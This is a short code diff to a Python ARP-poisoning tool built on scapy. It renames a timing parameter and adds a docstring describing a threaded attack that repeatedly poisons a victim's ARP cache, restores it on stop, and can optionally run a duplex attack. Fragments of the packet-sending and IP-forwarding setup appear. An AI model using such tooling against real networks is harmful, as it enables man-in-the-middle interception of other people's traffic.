@@ -8,12 +8,18 @@ from scapy.sendrecv import sendp
 
 
 class Poisoner:
-    def __init__(self, gateway_ip: str, gateway_mac: str, target_ip: str, target_mac: str, frequency: float = 1):
+    """
+    This is a wrapper for a Python Thread which will run every sleep_time seconds ARP poisoning a victim. Calling the
+    stop method will stop (almost) immediately the Thread restoring the ARP table of the victim. If the commented
+    fragments were removed, a duplex attack would be performed, but this is usually blocked by modern routers, so it
+    is disabled by default.
+    """
+    def __init__(self, gateway_ip: str, gateway_mac: str, target_ip: str, target_mac: str, sleep_time: float = 1):
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
         self.target_ip = target_ip
         self.target_mac = target_mac
-        self.frequency = frequency
+        self.sleep_time = sleep_time
 
         self.__event = Event()
         self.__thread = Thread(target=self.__poison, daemon=True)
@@ -34,7 +40,7 @@ class Poisoner:
                                                     psrc=self.target_ip), verbose=False)
             """
 
-            self.__event.wait(self.frequency)
+            self.__event.wait(self.sleep_time)
 
         # Make the victim think the gateway is actually the gateway
         sendp(Ether(dst=self.target_mac) / ARP(op="is-at",
@@ -56,7 +62,7 @@ class Poisoner:
 
     def stop_and_join(self):
         self.stop()
-        self.__thread.join(self.frequency)
+        self.__thread.join(self.sleep_time)
 
 
 __linux_filename = "/proc/sys/net/ipv4/ip_forward"
